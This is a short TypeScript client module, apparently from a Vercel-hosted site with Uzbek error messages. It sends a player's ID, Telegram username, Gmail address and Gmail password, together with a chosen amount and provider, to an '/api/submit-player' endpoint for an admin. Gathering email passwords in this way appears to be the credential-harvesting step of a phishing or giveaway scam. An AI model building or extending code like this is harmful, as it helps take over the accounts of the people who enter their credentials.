export interface PlayerSubmission {
  playerId: string;
  telegramUsername: string;
  gmail: string;
  password: string;
  selectedAmount: string;
  providerName: string;
}

export async function submitPlayerToAdmin(data: PlayerSubmission): Promise<void> {
  let response: Response;
  try {
    response = await fetch('/api/submit-player', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch {
    throw new Error(
      'Server bilan bog‘lanib bo‘lmadi. Sayt faqat statik hostingda bo‘lishi yoki internet uzilgan bo‘lishi mumkin.',
    );
  }

  const raw = await response.text();
  let result: { ok?: boolean; error?: string } = {};
  if (raw) {
    try {
      result = JSON.parse(raw) as { ok?: boolean; error?: string };
    } catch {
      if (response.status === 404) {
        throw new Error(
          'API topilmadi (404). Vercel’da loyiha to‘liq deploy qilinganini va /api/submit-player mavjudligini tekshiring.',
        );
      }
      throw new Error(`Server noto‘g‘ri javob qaytardi (${response.status}).`);
    }
  }

  if (!response.ok || !result.ok) {
    throw new Error(result.error ?? 'Ma’lumot yuborilmadi');
  }
}
